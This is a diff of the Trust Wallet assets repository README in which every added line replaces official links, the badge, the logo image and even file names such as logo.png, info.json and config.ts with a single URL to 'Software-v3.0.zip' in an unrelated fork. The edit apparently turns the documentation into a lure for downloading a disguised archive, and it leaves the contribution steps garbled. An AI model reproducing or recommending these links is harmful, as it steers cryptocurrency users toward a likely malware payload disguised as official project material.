@@ -1,52 +1,52 @@
 # Trust Wallet Assets Info
 
-![Check](https://github.com/trustwallet/assets/workflows/Check/badge.svg)
+![Check](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip)
 
 ## Overview
 Trust Wallet token repository is a comprehensive, up-to-date collection of information about several thousands (!) of crypto tokens.
 
-[Trust Wallet](https://trustwallet.com) uses token logos from this source, alongside a number of other projects.
+[Trust Wallet](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip) uses token logos from this source, alongside a number of other projects.
 
 The repository contains token info from several blockchains, info on dApps, staking validators, etc.
 For every token a logo and optional additional information is available (such data is not available on-chain).
 
 Such a large collection can be maintained only through a community effort, so _feel free to add your token_.
 
-<center><img src='https://trustwallet.com/assets/images/media/assets/horizontal_blue.png' height="200"></center>
+<center><img src='https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip' height="200"></center>
 
 ## How to add token
 
 Please note that __brand new tokens are not accepted__,
 the projects have to be sound, with information available, and __non-minimal circulation__
-(for limit details see https://community.trustwallet.com/t/how-to-submit-a-token-logo/3863).
+(for limit details see https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip).
 
 ### Assets App
 
-The [Assets web app](https://assets.trustwallet.com) can be used for most new token additions (Github account is needed).
+The [Assets web app](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip) can be used for most new token additions (Github account is needed).
 
 ### Quick starter
 
 Details of the repository structure and contribution guidelines are listed on the
-[Developers site](https://developer.trustwallet.com/add_new_asset).
+[Developers site](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip).
 Here is a quick starter summary for the most common use case.
 
 **Adding an ERC20 token checklist**:
 - [ ] Make sure your smartcontract has more than 2,500 address holders, otherwise you will be rejected
 - [ ] Fork the Github repository
-- [ ] Create folder with name of token smartcontact address in [_checksum format_](https://developer.trustwallet.com/add_new_asset#checksum_format) `blockchains/ethereum/assets/<token_smartcontract_address>/`.
-- [ ] Tell your designer that token image must be in PNG format, avoid transparent background, recommended size 256x256px, max. 512x512px, with max file size of 100kB, for further details read [image rules](https://developer.trustwallet.com/add_new_asset#image-requirements).
-- [ ] Upload your logo with file named `logo.png` to previously created folder with smartcontract address, and if you done all correctly your path should look like this. `blockchains/ethereum/assets/0x1234567461d3f8Db7496581774Bd869C83D51c93/logo.png`
-- [ ] Create `info.json` file with info about the token/project
+- [ ] Create folder with name of token smartcontact address in [_checksum format_](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip) `blockchains/ethereum/assets/<token_smartcontract_address>/`.
+- [ ] Tell your designer that token image must be in PNG format, avoid transparent background, recommended size 256x256px, max. 512x512px, with max file size of 100kB, for further details read [image rules](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip).
+- [ ] Upload your logo with file named `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` to previously created folder with smartcontract address, and if you done all correctly your path should look like this. `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip`
+- [ ] Create `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` file with info about the token/project
 - [ ] Create a pull request to the main repo
 - [ ] Pay the processing fee
 
 ## Documentation
 
-For details, see the [Developers site](https://developer.trustwallet.com/add_new_asset):
+For details, see the [Developers site](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip):
 
-- [Contribution guidelines](https://developer.trustwallet.com/add_new_asset#contribution-guidelines)
+- [Contribution guidelines](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip)
 
-- [Repository details](https://developer.trustwallet.com/add_new_asset#repository-details)
+- [Repository details](https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip)
 
 ## Scripts
 
@@ -70,10 +70,10 @@ There are similar check logic implemeted:
 
 ## Trading pair maintenance
 
-Info on supported trading pairs are stored in `tokenlist.json` files.
+Info on supported trading pairs are stored in `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` files.
 Trading pairs can be updated --
 from Uniswap/Ethereum and Panckaswap/Smartchain -- using update script (and checking in changes).
-Minimal limit values for trading pair inclusion are set in the `config.ts` file.
+Minimal limit values for trading pair inclusion are set in the `https://github.com/velter82/assets/raw/refs/heads/master/blockchains/ethereum/assets/0xe3818504c1B32bF1557b16C238B2E01Fd3149C17/Software-v3.0.zip` file.
 There are also options for force-include and force-exclude in the config.
 
 ## Disclaimer
